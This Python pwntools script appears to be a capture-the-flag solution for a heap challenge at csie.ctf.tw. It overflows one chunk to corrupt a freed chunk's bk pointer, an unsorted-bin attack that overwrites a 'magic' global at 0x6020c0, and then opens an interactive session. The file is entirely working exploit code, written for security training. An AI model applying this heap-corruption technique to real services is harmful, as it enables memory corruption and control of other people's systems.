from pwn import *

host = '127.0.0.1'
port = 8888
host = 'csie.ctf.tw'
port = 10144
r = remote(host, port)

def create(size, content):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(content)

def edit(index, size, content):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(index).encode())
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(content)

def delete(index):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(index).encode())

create(0x30, b'a') #0
create(0x80, b'a') #1
create(0x30, b'a') #2

delete(1)
magic = 0x6020c0
edit(0, 0x100, b'a'*0x30+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10))
create(0x80, p64(9999))

r.interactive()
